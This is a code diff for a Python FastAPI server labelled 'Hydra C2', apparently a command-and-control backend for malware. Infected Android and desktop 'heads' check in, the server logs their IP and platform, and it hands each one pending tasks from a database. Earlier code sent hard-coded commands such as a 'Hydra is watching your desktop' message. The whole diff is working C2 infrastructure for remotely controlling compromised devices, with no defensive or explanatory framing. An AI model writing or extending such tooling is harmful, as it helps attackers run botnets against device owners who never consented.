@@ -1,11 +1,13 @@
 from fastapi import FastAPI, Request
 from fastapi.middleware.cors import CORSMiddleware
 from contextlib import asynccontextmanager
-from db import init_db, register_client
+from db import init_db, register_client, get_pending_task, complete_task
 import uvicorn
+import json
 
 def print_banner():
-    banner = """
+    # Added 'r' before quotes to fix SyntaxWarning
+    banner = r"""
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
@@ -35,27 +37,24 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-@app.get("/")
-async def status():
-    return {"hydra": "online", "status": "active"}
-
 @app.api_route("/checkin/{client_id}", methods=["GET", "POST"])
 async def checkin(client_id: str, platform: str, request: Request):
     client_ip = request.client.host
-    method = request.method
     
-    print(f"[*] {method} request received from {client_id}")
-    print(f"[*] Source IP: {client_ip} | Platform: {platform}")
-
+    # 1. Register the head in the DB
     await register_client(client_id, platform, client_ip)
     
-    # --- COMMAND PARSER LOGIC ---
-    # Logic to decide which command to send based on platform
+    # 2. Check for specific tasks for this ID
+    task = await get_pending_task(client_id)
     command_payload = None
-    if platform.lower() == "android":
-        command_payload = {"action": "vibrate", "duration": 1500}
-    elif platform.lower() == "desktop":
-        command_payload = {"action": "msg", "content": "Hydra is watching your desktop."}
+
+    if task:
+        command_payload = {
+            "action": task["action"],
+            "data": json.loads(task["payload"])
+        }
+        await complete_task(task["task_id"])
+        print(f"[!] Task DISPATCHED to {client_id}: {task['action']}")
 
     return {
         "status": "success",
@@ -65,9 +64,10 @@ async def checkin(client_id: str, platform: str, request: Request):
 
 if __name__ == "__main__":
     uvicorn.run(
-        app, 
+        "main:app", # Recommended format for uvicorn
         host="0.0.0.0", 
         port=8443, 
         ssl_keyfile="key.pem", 
-        ssl_certfile="cert.pem"
+        ssl_certfile="cert.pem",
+        reload=True # Good for development
     )
